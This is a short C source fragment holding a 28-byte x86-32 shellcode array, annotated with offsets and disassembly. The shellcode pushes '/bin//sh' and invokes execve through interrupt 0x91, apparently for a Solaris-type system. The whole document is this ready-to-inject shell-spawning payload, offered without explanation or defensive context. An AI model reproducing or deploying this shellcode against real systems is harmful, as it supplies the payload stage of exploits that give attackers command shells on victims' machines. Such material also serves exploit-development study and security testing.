
// Target architecture : X86 32

#define SH_SIZE 28

char SH[] = {
  /* 0000 */ "\x6a\x3b"             /* push 0x3b       */
  /* 0002 */ "\x58"                 /* pop  eax        */
  /* 0003 */ "\x99"                 /* cdq             */
  /* 0004 */ "\x52"                 /* push edx        */
  /* 0005 */ "\x68\x2f\x2f\x73\x68" /* push 0x68732f2f */
  /* 000A */ "\x68\x2f\x62\x69\x6e" /* push 0x6e69622f */
  /* 000F */ "\x89\xe3"             /* mov  ebx, esp   */
  /* 0011 */ "\x52"                 /* push edx        */
  /* 0012 */ "\x53"                 /* push ebx        */
  /* 0013 */ "\x89\xe1"             /* mov  ecx, esp   */
  /* 0015 */ "\x52"                 /* push edx        */
  /* 0016 */ "\x52"                 /* push edx        */
  /* 0017 */ "\x51"                 /* push ecx        */
  /* 0018 */ "\x53"                 /* push ebx        */
  /* 0019 */ "\x52"                 /* push edx        */
  /* 001A */ "\xcd\x91"             /* int  0x91       */
};